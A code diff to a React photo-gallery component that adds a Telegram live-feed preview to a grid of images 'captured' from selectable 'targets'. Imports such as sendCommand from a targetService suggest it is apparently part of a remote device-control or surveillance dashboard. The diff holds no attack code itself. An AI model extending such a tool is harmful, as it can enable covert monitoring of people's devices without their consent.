@@ -5,9 +5,11 @@ import { Camera, X, Image as ImageIcon, ChevronDown } from 'lucide-react';
 import { clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
 import { useImageCaptures } from '@/hooks/useFirebase';
+import { useTelegramPhoto } from '@/hooks/useTelegram';
 import { sendCommand } from '@/services/targetService';
 import { toast } from '@/lib/toast';
 import { Target } from '@/types/target';
+import { RefreshCcw } from 'lucide-react';
 
 const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));
 
@@ -19,6 +21,7 @@ interface PhotoGalleryProps {
 
 export default function PhotoGallery({ targetId, targets = [], onTargetChange }: PhotoGalleryProps) {
   const { images, isLoading } = useImageCaptures(targetId);
+  const { photo: tgPhoto, timestamp: tgTimestamp, refresh: refreshTg } = useTelegramPhoto();
   const [sending, setSending] = useState(false);
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
   const [showDeviceDropdown, setShowDeviceDropdown] = useState(false);
@@ -116,33 +119,63 @@ export default function PhotoGallery({ targetId, targets = [], onTargetChange }:
         </div>
 
         {/* ── Photo Grid ── */}
-        <div className="grid grid-cols-2 gap-2 max-h-[500px] overflow-y-auto pr-1">
-          {isLoading ? (
-             [...Array(4)].map((_, i) => (
-               <div key={i} className="aspect-square rounded-xl bg-white/[0.03] animate-pulse border border-white/[0.04]" />
-             ))
-          ) : !targetId ? (
-            <div className="col-span-2 py-16 text-center text-slate-600 text-sm">Select a target to view photos</div>
-          ) : images.length === 0 ? (
-            <div className="col-span-2 py-16 text-center flex flex-col items-center gap-2">
-               <ImageIcon size={28} className="text-slate-700" />
-               <p className="text-slate-600 text-xs">No photos captured yet</p>
-            </div>
-          ) : (
-            images.map((img) => (
-              <div key={img.id} className="group relative aspect-square rounded-xl overflow-hidden border border-white/[0.06] bg-black/30">
-                <img
-                  src={img.url}
-                  alt="Capture"
-                  className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105 cursor-zoom-in"
-                  onClick={() => setSelectedImage(img.url)}
-                />
-                <div className="absolute inset-x-0 bottom-0 p-2.5 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
-                   <p className="text-[10px] text-white/80 font-mono">{new Date(img.timestamp).toLocaleString()}</p>
+        <div className="space-y-4 max-h-[600px] overflow-y-auto pr-1">
+          {/* Telegram Live Preview (Sticky/Highlighted) */}
+          {tgPhoto && (
+            <div className="relative group aspect-video rounded-xl overflow-hidden border border-cyan-500/30 bg-black/40 shadow-lg shadow-cyan-500/5">
+              <img 
+                src={tgPhoto} 
+                alt="Telegram Live" 
+                className="w-full h-full object-cover cursor-zoom-in"
+                onClick={() => setSelectedImage(tgPhoto)}
+              />
+              <div className="absolute inset-x-0 bottom-0 p-2 bg-gradient-to-t from-black/80 to-transparent">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-[9px] text-cyan-400 font-bold uppercase tracking-tighter">LATEST TELEGRAM FEED</p>
+                    <p className="text-[8px] text-white/60 font-mono">
+                      {tgTimestamp ? new Date(tgTimestamp).toLocaleTimeString() : 'Live'}
+                    </p>
+                  </div>
+                  <button 
+                    onClick={(e) => { e.stopPropagation(); refreshTg(); }}
+                    className="p-1 rounded bg-black/40 border border-white/10 text-white/60 hover:text-cyan-400 transition-colors"
+                  >
+                    <RefreshCcw size={10} />
+                  </button>
                 </div>
               </div>
-            ))
+            </div>
           )}
+
+          <div className="grid grid-cols-2 gap-2">
+            {isLoading ? (
+               [...Array(4)].map((_, i) => (
+                 <div key={i} className="aspect-square rounded-xl bg-white/[0.03] animate-pulse border border-white/[0.04]" />
+               ))
+            ) : !targetId ? (
+              <div className="col-span-2 py-16 text-center text-slate-600 text-sm">Select a target to view photos</div>
+            ) : images.length === 0 && !tgPhoto ? (
+              <div className="col-span-2 py-16 text-center flex flex-col items-center gap-2">
+                 <ImageIcon size={28} className="text-slate-700" />
+                 <p className="text-slate-600 text-xs">No photos captured yet</p>
+              </div>
+            ) : (
+              images.map((img) => (
+                <div key={img.id} className="group relative aspect-square rounded-xl overflow-hidden border border-white/[0.06] bg-black/30">
+                  <img
+                    src={img.url}
+                    alt="Capture"
+                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105 cursor-zoom-in"
+                    onClick={() => setSelectedImage(img.url)}
+                  />
+                  <div className="absolute inset-x-0 bottom-0 p-2.5 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
+                     <p className="text-[10px] text-white/80 font-mono">{new Date(img.timestamp).toLocaleString()}</p>
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
         </div>
       </div>
 
